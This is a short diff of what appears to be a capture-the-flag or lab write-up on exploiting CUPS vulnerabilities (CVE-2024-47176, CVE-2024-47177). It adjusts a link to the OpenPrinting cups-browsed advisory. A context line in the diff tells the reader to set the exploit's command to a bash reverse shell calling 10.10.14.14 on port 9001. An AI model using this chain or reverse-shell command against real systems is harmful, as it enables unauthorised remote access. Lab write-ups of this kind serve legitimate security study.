@@ -76,7 +76,7 @@ I see that has 4 CVE:
 - CVE-2024-47176 carries a CVSS score of 5.3, reflecting the potential for exploitation via the cups-browsed service
 - CVE-2024-47177 is another critical vulnerability, also scoring 9.0 (previously 9.9), as it allows attackers to bypass security measures by sending malformed IPP requests​
 
-Combine this a report in github can get RCE from CUPS service in link [open printing rce]("https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8")
+Combine this a report in github can get RCE from CUPS service in link [open printing rce]("https://github.com/OpenPrinting/cups-browsed") in ```security``` tab
 
 Use it and change ```command``` to get reverse shell in port ```9001``` to "bash -c 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1'"
 
